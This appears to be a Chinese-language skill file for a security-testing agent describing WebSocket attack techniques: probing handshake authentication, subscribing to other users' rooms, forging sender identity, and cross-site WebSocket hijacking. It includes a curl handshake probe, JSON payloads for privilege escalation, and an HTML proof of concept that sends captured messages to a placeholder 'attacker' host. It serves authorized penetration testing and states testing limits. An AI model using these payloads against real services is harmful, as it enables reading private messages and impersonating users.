---
name: websocket-attack
description: 【验证】WebSocket 攻击面：握手鉴权、消息级越权（改 userId/roomId 收他人消息）、跨站 WebSocket 劫持、消息注入与协议层问题，含"如何用最小客户端复现"
whenToUse: 目标用 WebSocket 传实时数据（聊天/通知/交易推送/协作），或发现 ws/wss 端点时
role: exploit
category: 验证
tags: [websocket, ws, realtime, 越权, 消息注入]
enabled: true
---

# WebSocket 攻击面

> WebSocket 的特点：**握手只鉴权一次，之后每条消息常常不再校验**。
> 所以重点在**消息级别**，不在握手。

## 一、先找到端点

| 来源 | 说明 |
|---|---|
| 前端 JS | 搜 `new WebSocket(`、`ws://`、`wss://`、`socket.io` |
| 网络面板 | 筛选 WS 类型请求 |
| 常见路径 | `/ws` `/socket` `/websocket` `/socket.io/?EIO=4` |

## 二、握手是否鉴权

```bash
# 不带 Cookie/Token 直接连
curl -s -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  "https://target/ws"
```
**判据**：返回 `101 Switching Protocols` 且能收发消息 → 握手不鉴权。

**注意**：很多实现"握手不鉴权但首条消息要 token"，要继续看消息层。

## 三、消息级测试（核心）

### 1. 越权订阅/接收（最高价值）

```json
{"action":"subscribe","roomId":"1001"}
{"action":"join","groupId":"admin"}
{"userId":"other_user_id"}
```
**判据**：收到**不属于自己**的消息（他人聊天内容/他人订单状态）。

### 2. 身份伪造

```json
{"action":"send","from":"admin","content":"test"}
{"action":"auth","token":"<自己token>","role":"admin"}
```
**判据**：消息被当作他人/管理员发出。

### 3. 消息注入到下游

若消息内容被存入数据库并在 Web 显示 → 存储型 XSS 面；若被拼进命令/SQL → 更严重。

### 4. 跨站 WebSocket 劫持（CSWSH）

若握手**只依赖 Cookie** 且**不校验 Origin**：
```html
<script>
  var ws = new WebSocket("wss://target/ws");
  ws.onmessage = e => fetch("https://attacker/?d="+encodeURIComponent(e.data));
</script>
```
**判据**：在攻击者页面能建立连接并收到受害者数据。

## 四、复现工具（最小客户端）

推荐用 `websocat` 或 python `websocket-client`：
```bash
websocat -H="Cookie: <自己的>" "wss://target/ws"
> {"action":"subscribe","roomId":"1001"}
```

## 五、判定标准

| 结果 | 结论 |
|---|---|
| 无凭据可订阅他人房间并收到消息 | ✅ 高（越权读） |
| 可伪造他人身份发消息 | ✅ 高 |
| Origin 不校验 + Cookie 鉴权 → CSWSH | ✅ 中高 |
| 握手不鉴权但消息需 token 且校验正常 | ⚠️ 低 |
| 能连上但收不到任何数据 | ❌ 不算 |

## 六、证据要求

1. 握手请求（含/不含凭据）
2. 消息收发的原始帧（**含他人数据时脱敏**）
3. CSWSH：攻击者页面 HTML + 收到的数据截图

## 七、失败判据

- 握手与消息都严格校验 token → 放弃
- 连上后无任何业务消息 → 该端点是心跳通道
- 需要客户端证书 → 放弃

## 八、边界

- 收到他人消息**只看 1–2 条即停**，不持续监听
- 不发骚扰消息给真实用户
- 不做大量连接（会耗尽服务端资源）

## 九、常见坑

| 坑 | 说明 |
|---|---|
| 只测握手不测消息 | 价值全在消息层 |
| 忽略 socket.io 的握手协议 | 要按 `EIO=4` 格式发 `40` 前缀 |
| 忘记看 Origin 校验 | CSWSH 的关键 |
| 用生产房间号测 | 可能骚扰真实用户，用测试房间 |
